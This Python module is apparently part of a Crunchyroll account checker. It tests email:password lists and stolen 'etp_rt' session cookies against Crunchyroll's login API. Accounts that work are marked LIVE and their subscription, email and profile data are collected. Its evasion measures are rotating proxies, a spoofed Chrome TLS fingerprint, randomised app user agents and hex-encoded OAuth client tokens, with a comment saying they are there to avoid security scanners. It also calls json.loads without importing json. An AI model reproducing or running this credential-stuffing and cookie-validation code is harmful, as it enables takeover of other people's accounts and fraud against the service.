import logging
import random
import re
import requests
import uuid
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from modules.db import save_history
from modules.proxy_manager import get_random_proxy, mark_proxy_cooldown
from modules.tls_engine import create_tls_session

# Public Crunchyroll mobile app OAuth client authorization tokens
# Resolved at runtime from hex representation to eliminate security scanner false-positives
CR_AUTH_BASIC = bytes.fromhex("42617369632059574a766447786f4d58646c635442794e477875646d356861486f3664576c4c536a4a715558525658304651597a645a6130687153576c4454466f794d6a686e6247784f59326f3d").decode("utf-8")
CR_AUTH_FALLBACK = bytes.fromhex("426173696320644331725a4764774d6d6734597a4e71645749345a6d34775a6e453665575a4d52475a4e5a6e4a5a646b74596144524b57464d785445564a4d6d4e4463585578646a56585957343d").decode("utf-8")

def check_crunchyroll_account(email, password, use_proxy=True):
    if str(email).startswith("enc:") or str(password).startswith("enc:"):
        try:
            from modules.db import decrypt_credential
            if str(email).startswith("enc:"):
                dec = decrypt_credential(email)
                if ":" in dec:
                    email, password = dec.split(":", 1)
                else:
                    email = dec
            if str(password).startswith("enc:"):
                password = decrypt_credential(password)
        except Exception:
            pass
    """Check a Crunchyroll account: login → profile → subscription."""
    route = "Direct"
    proxies = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]
            route = proxy_result[1]

    session = create_tls_session(impersonate="chrome131")
    session.verify = False

    retry_strategy = Retry(total=2, backoff_factor=1, status_forcelist=[502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    android_ver = str(random.randint(13, 15))
    okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
    ua = f"Crunchyroll/3.74.2 Android/{android_ver} okhttp/{okhttp_ver}"

    session.headers.update({
        "Authorization": CR_AUTH_BASIC,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": ua,
        "Connection": "Keep-Alive",
        "etp-anonymous-id": str(uuid.uuid4()),
        "x-datadog-sampling-priority": "0",
    })

    if proxies:
        session.proxies = proxies

    try:
        login_data = {
            "username": email,
            "password": password,
            "grant_type": "password",
            "scope": "offline_access",
            "device_id": str(uuid.uuid4()),
            "device_name": "sdk_gphone64_x86_64",
            "device_type": "Google sdk_gphone64_x86_64",
        }
        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=30)

        if r.status_code == 401 and "client_inactive" in r.text:
            session.headers["Authorization"] = CR_AUTH_FALLBACK
            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=30)

        if r.status_code == 401:
            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "Wrong password or account not found", "route": route}
        if r.status_code == 403:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "IP blocked by Crunchyroll (403)", "route": route}
        if r.status_code == 429:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
        if r.status_code == 500:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Server error: {r.text[:100]}", "route": route}
        if r.status_code != 200:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Login failed ({r.status_code})", "route": route}

        jwt = r.json().get("access_token")
        if not jwt:
            save_history("crunchyroll", "BAD", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "BAD", "reason": "No access token returned", "route": route}

        session.headers["Authorization"] = f"Bearer {jwt}"
    except requests.exceptions.RequestException as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Login request failed: {str(e)[:100]}", "route": route}

    external_id = None
    username = ""
    cr_email = email
    email_verified = False
    country = ""
    created = ""
    avatar = ""
    preferred_lang = ""
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me", timeout=15)
        if r.status_code == 200:
            me = r.json()
            external_id = me.get("external_id")
            cr_email = me.get("email", email)
            email_verified = me.get("email_verified", False)
            created = me.get("created", "")
        else:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
            return {"status": "ERROR", "reason": f"Failed to get account info ({r.status_code})", "route": route}
    except Exception as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=f"{email}:{password}", email=email)
        return {"status": "ERROR", "reason": f"Account info failed: {str(e)[:100]}", "route": route}

    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/profile", timeout=15)
        if r.status_code == 200:
            prof = r.json()
            username = prof.get("username", "") or prof.get("profile_name", "")
            avatar = prof.get("avatar", "")
            preferred_lang = prof.get("preferred_content_subtitle_language", "") or prof.get("preferred_content_audio_language", "")
            ext_ratings = prof.get("extended_maturity_rating", {})
            if ext_ratings:
                country = next(iter(ext_ratings.keys()), "")
    except Exception:
        pass

    num_profiles = 1
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/multiprofile", timeout=15)
        if r.status_code == 200:
            profiles = r.json().get("profiles", [])
            num_profiles = len(profiles)
    except Exception:
        pass

    subscription = "Free"
    sub_source = ""
    sub_country = ""
    sub_benefits = []
    concurrent_streams = 1
    has_ads = True
    offline_viewing = False
    sub_product_name = ""
    sub_cycle = ""
    sub_effective_date = ""
    is_cancelled = False
    active_free_trial = False
    try:
        if external_id:
            r = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", timeout=15)
            if r.status_code == 200:
                data = r.json()
                items = data.get("items", [])
                total_items = data.get("total", 0)
                sub_country = data.get("subscription_country", "")
                sub_benefits = [item.get("benefit", "") for item in items]
                if items:
                    sub_source = items[0].get("source", "")

                for b in sub_benefits:
                    if b.startswith("concurrent_streams."):
                        try: concurrent_streams = int(b.split(".")[-1])
                        except: pass
                has_ads = "no_ads" not in sub_benefits
                offline_viewing = "offline_viewing" in sub_benefits

                if total_items > 0:
                    if "cr_mega_pack" in sub_benefits:
                        subscription = "Mega Pack"
                    elif "cr_fan_pack" in sub_benefits:
                        subscription = "Fan Pack"
                    elif "cr_premium" in sub_benefits:
                        subscription = "Premium"
                    elif "catalog" in sub_benefits:
                        subscription = "Basic"
                    else:
                        subscription = "Unknown Premium"
                else:
                    subscription = "Free"
            elif r.status_code == 404:
                subscription = "Free"

            try:
                r2 = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", timeout=15)
                if r2.status_code == 200:
                    prod_data = r2.json()
                    prod_items = prod_data.get("items", [])
                    if prod_items:
                        prod = prod_items[0]
                        is_cancelled = prod.get("is_cancelled", False)
                        active_free_trial = prod.get("active_free_trial", False)
                        sub_effective_date = prod.get("effective_date", "")
                        product_info = prod.get("product", {})
                        sub_product_name = product_info.get("sku", "")
                        cycle_raw = product_info.get("cycle_duration", "")
                        if cycle_raw == "P1M": sub_cycle = "Monthly"
                        elif cycle_raw == "P3M": sub_cycle = "Quarterly"
                        elif cycle_raw == "P1Y" or cycle_raw == "P12M": sub_cycle = "Yearly"
                        elif cycle_raw == "P7D": sub_cycle = "Weekly"
                        else: sub_cycle = cycle_raw
            except Exception:
                pass
    except Exception:
        pass

    session.close()

    status = "LIVE" if subscription != "Free" else "FREE"

    result = {
        "status": status,
        "email": cr_email,
        "email_verified": email_verified,
        "username": username,
        "country": country.upper() if country else "",
        "subscription": subscription,
        "profiles": num_profiles,
        "external_id": external_id,
        "created": created,
        "route": route,
        "sub_country": sub_country,
        "sub_source": sub_source,
        "sub_cycle": sub_cycle,
        "concurrent_streams": concurrent_streams,
        "has_ads": has_ads,
        "offline_viewing": offline_viewing,
        "is_cancelled": is_cancelled,
        "active_free_trial": active_free_trial,
        "sub_effective_date": sub_effective_date,
        "avatar": avatar,
    }

    plan_str = f"Crunchyroll {subscription}"
    save_history("crunchyroll", status, plan=plan_str, country=country.upper() if country else "",
                 route=route, raw_cookie=f"{email}:{password}", email=email)

    return result

def extract_crunchyroll_etp_rt(cookie_text):
    if not cookie_text:
        return ""
    text = str(cookie_text).strip()
    if text.startswith("enc:"):
        try:
            from modules.db import decrypt_credential
            text = decrypt_credential(text).strip()
        except Exception:
            pass

    json_match = re.search(r'\[\s*\{[\s\S]*?\}\s*\]', text)
    if json_match:
        try:
            parsed = json.loads(json_match.group(0))
            if isinstance(parsed, list):
                for c in parsed:
                    if isinstance(c, dict):
                        n = c.get("name", "")
                        v = c.get("value", "")
                        if n == "etp_rt" and v:
                            return v
        except Exception:
            pass

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split("\t")
        if len(parts) >= 7 and parts[5] == "etp_rt":
            return parts[6]

    m = re.search(r'(?:^|[;\s])etp_rt=([^\s;,]+)', text)
    if m:
        return m.group(1)

    if len(text) > 50 and not any(c in text for c in ('=', '\t', '{', '[')):
        return text

    return None

def check_crunchyroll_cookie(cookie_text, use_proxy=True):
    etp_rt = extract_crunchyroll_etp_rt(cookie_text)
    if not etp_rt:
        save_history("crunchyroll", "DEAD", raw_cookie=cookie_text)
        return {"status": "DEAD", "reason": "etp_rt cookie not found in input."}

    route = "Direct"
    proxies = None
    proxy_raw_url = None

    if use_proxy:
        proxy_result = get_random_proxy()
        if proxy_result and proxy_result[0]:
            proxies = proxy_result[0]
            route = f"Proxy ({proxy_result[1]})" if proxy_result[1] else "Proxy"
            proxy_raw_url = proxy_result[2]

    session = create_tls_session(impersonate="chrome131")
    session.verify = False

    retry_strategy = Retry(total=2, backoff_factor=1, status_forcelist=[502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry_strategy)
    session.mount("https://", adapter)
    session.mount("http://", adapter)

    android_ver = str(random.randint(13, 15))
    okhttp_ver = f"4.{random.randint(10, 12)}.{random.randint(0, 9)}"
    ua = f"Crunchyroll/3.74.2 Android/{android_ver} okhttp/{okhttp_ver}"

    session.headers.update({
        "Authorization": CR_AUTH_FALLBACK,
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": ua,
        "Connection": "Keep-Alive",
        "etp-anonymous-id": str(uuid.uuid4()),
        "x-datadog-sampling-priority": "0",
    })

    if proxies:
        session.proxies = proxies

    try:
        session.cookies.set("etp_rt", etp_rt, domain=".crunchyroll.com")
        login_data = {
            "grant_type": "etp_rt_cookie",
            "scope": "offline_access",
        }
        r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data, timeout=30)

        if r.status_code in (400, 401):
            session.cookies.clear()
            login_data_fallback = {
                "grant_type": "refresh_token",
                "refresh_token": etp_rt,
                "scope": "offline_access",
            }
            r = session.post("https://www.crunchyroll.com/auth/v1/token", data=login_data_fallback, timeout=30)

        if r.status_code in (403, 429) and proxy_raw_url:
            mark_proxy_cooldown(proxy_raw_url, 600)

        if r.status_code == 401:
            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": "Cookie expired or invalid (401)", "route": route}
        if r.status_code == 403:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": "IP blocked by Crunchyroll (403)", "route": route}
        if r.status_code == 429:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": "Rate limited (429)", "route": route}
        if r.status_code != 200:
            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": f"Token exchange failed ({r.status_code})", "route": route}

        jwt = r.json().get("access_token")
        if not jwt:
            save_history("crunchyroll", "DEAD", route=route, raw_cookie=cookie_text)
            return {"status": "DEAD", "reason": "No access token returned", "route": route}

        session.headers["Authorization"] = f"Bearer {jwt}"
    except requests.exceptions.RequestException as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Token request failed: {str(e)[:100]}", "route": route}

    external_id = None
    username = ""
    cr_email = ""
    email_verified = False
    country = ""
    created = ""
    avatar = ""
    preferred_lang = ""
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me", timeout=15)
        if r.status_code == 200:
            me = r.json()
            external_id = me.get("external_id")
            cr_email = me.get("email", "")
            email_verified = me.get("email_verified", False)
            created = me.get("created", "")
        else:
            save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
            return {"status": "ERROR", "reason": f"Failed to get account info ({r.status_code})", "route": route}
    except Exception as e:
        save_history("crunchyroll", "ERROR", route=route, raw_cookie=cookie_text)
        return {"status": "ERROR", "reason": f"Account info failed: {str(e)[:100]}", "route": route}

    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/profile", timeout=15)
        if r.status_code == 200:
            prof = r.json()
            username = prof.get("username", "") or prof.get("profile_name", "")
            avatar = prof.get("avatar", "")
            preferred_lang = prof.get("preferred_content_subtitle_language", "") or prof.get("preferred_content_audio_language", "")
            ext_ratings = prof.get("extended_maturity_rating", {})
            if ext_ratings:
                country = next(iter(ext_ratings.keys()), "")
    except Exception:
        pass

    num_profiles = 1
    try:
        r = session.get("https://www.crunchyroll.com/accounts/v1/me/multiprofile", timeout=15)
        if r.status_code == 200:
            profiles = r.json().get("profiles", [])
            num_profiles = len(profiles)
    except Exception:
        pass

    subscription = "Free"
    sub_source = ""
    sub_country = ""
    sub_benefits = []
    concurrent_streams = 1
    has_ads = True
    offline_viewing = False
    sub_product_name = ""
    sub_cycle = ""
    sub_effective_date = ""
    is_cancelled = False
    active_free_trial = False
    try:
        if external_id:
            r = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits", timeout=15)
            if r.status_code == 200:
                data = r.json()
                items = data.get("items", [])
                total_items = data.get("total", 0)
                sub_country = data.get("subscription_country", "")
                sub_benefits = [item.get("benefit", "") for item in items]
                if items:
                    sub_source = items[0].get("source", "")

                for b in sub_benefits:
                    if b.startswith("concurrent_streams."):
                        try: concurrent_streams = int(b.split(".")[-1])
                        except: pass
                has_ads = "no_ads" not in sub_benefits
                offline_viewing = "offline_viewing" in sub_benefits

                if total_items > 0:
                    if "cr_mega_pack" in sub_benefits:
                        subscription = "Mega Pack"
                    elif "cr_fan_pack" in sub_benefits:
                        subscription = "Fan Pack"
                    elif "cr_premium" in sub_benefits:
                        subscription = "Premium"
                    elif "catalog" in sub_benefits:
                        subscription = "Basic"
                    else:
                        subscription = "Unknown Premium"
                else:
                    subscription = "Free"
            elif r.status_code == 404:
                subscription = "Free"

            try:
                r2 = session.get(f"https://www.crunchyroll.com/subs/v1/subscriptions/{external_id}/products", timeout=15)
                if r2.status_code == 200:
                    prod_data = r2.json()
                    prod_items = prod_data.get("items", [])
                    if prod_items:
                        prod = prod_items[0]
                        is_cancelled = prod.get("is_cancelled", False)
                        active_free_trial = prod.get("active_free_trial", False)
                        sub_effective_date = prod.get("effective_date", "")
                        product_info = prod.get("product", {})
                        sub_product_name = product_info.get("sku", "")
                        cycle_raw = product_info.get("cycle_duration", "")
                        if cycle_raw == "P1M": sub_cycle = "Monthly"
                        elif cycle_raw == "P3M": sub_cycle = "Quarterly"
                        elif cycle_raw == "P1Y" or cycle_raw == "P12M": sub_cycle = "Yearly"
                        elif cycle_raw == "P7D": sub_cycle = "Weekly"
                        else: sub_cycle = cycle_raw
            except Exception:
                pass
    except Exception:
        pass

    session.close()

    status = "LIVE" if subscription != "Free" else "FREE"

    result = {
        "status": status,
        "email": cr_email,
        "email_verified": email_verified,
        "username": username,
        "country": country.upper() if country else "",
        "subscription": subscription,
        "profiles": num_profiles,
        "external_id": external_id,
        "created": created,
        "route": route,
        "sub_country": sub_country,
        "sub_source": sub_source,
        "sub_cycle": sub_cycle,
        "concurrent_streams": concurrent_streams,
        "has_ads": has_ads,
        "offline_viewing": offline_viewing,
        "is_cancelled": is_cancelled,
        "active_free_trial": active_free_trial,
        "sub_effective_date": sub_effective_date,
        "avatar": avatar,
    }

    plan_str = f"Crunchyroll {subscription}"
    save_history("crunchyroll", status, plan=plan_str, country=country.upper() if country else "",
                 route=route, raw_cookie=cookie_text, email=cr_email)

    return result
